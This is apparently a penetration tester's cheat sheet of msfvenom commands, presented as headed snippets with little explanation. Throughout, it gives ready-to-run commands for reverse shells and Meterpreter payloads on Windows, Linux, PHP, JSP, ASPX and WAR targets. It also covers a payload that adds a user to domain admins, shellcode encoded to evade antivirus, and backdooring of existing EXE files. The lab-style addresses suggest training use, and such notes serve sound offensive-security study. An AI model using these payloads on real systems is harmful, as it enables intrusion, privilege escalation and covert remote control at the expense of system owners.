
Add your user to a group dll
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" $username /add /domain' -f dll -o adduser.dll
```

ASPX webshell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8080 -f aspx > rev.aspx
```

DLL injection
```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.98 LPORT=80 -f dll > privesc.dll
```

Add user windows
```
msfvenom -p windows/adduser USER=root PASS=rootroot123! -f exe
msfvenom -p windows/adduser USER=root PASS=rootroot123! -f dll -f csharp
```

Powershell
```
msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.8 LPORT=8445 -f exe > msfInstaller.exe
```

Linux .so library as a reverse shell 
```
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379
```

Meterpreter 
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f elf > <[FILE_NAME.elf]>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f exe > <[FILE_NAME.exe]>

msfvenom -p php/meterpreter_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.php]>
msfvenomm -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f aspx > met_rev_443.aspx

cat <[FILE_NAME.php]> | pbcopy && echo '<?php ' | tr -d '\n' > <[FILE_NAME.php]> && pbpaste >> <[FILE_NAME.php]>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f asp > <[FILE_NAME.asp]>
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.jsp]>
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.jsp]>
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f war > <[FILE_NAME.war]>

```

Scripting Payloads

```
msfvenom -p cmd/unix/reverse_python LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.py]>
msfvenom -p cmd/unix/reverse_bash LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.sh]>
msfvenom -p cmd/unix/reverse_perl LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.pl]>

```

Binary Exploitation Payloads
```bash
msfvenom --arch x86 -p windows/shell_reverse_tcp LHOST=192.168.119.127 LPORT=80 EXITFUNC=thread  -f raw -o exp-1.txt

# Beware Shitganawry AV detections 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.195 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0A\x0D\x25\x26\x2B\x3D"
# smaller
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.195 LPORT=443 EXITFUNC=thread --smallest -f c -b "\x00\x0A\x0D\x25\x26\x2B\x3D"


```


Sed your way to success
```bash
sed 's/ /\\x/g'

sed 's/"\\/    "\\/g'
```


Backdoor EXE files
```
msfvenom -a x86 -x <[FILE]> -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.88 lport=443 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o <[FILE_NAME]>
```

Linux 
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=8443 -f elf -o fail2brain

linux/x64/shell_reverse_tcp
linux/x86/shell_reverse_tcp



```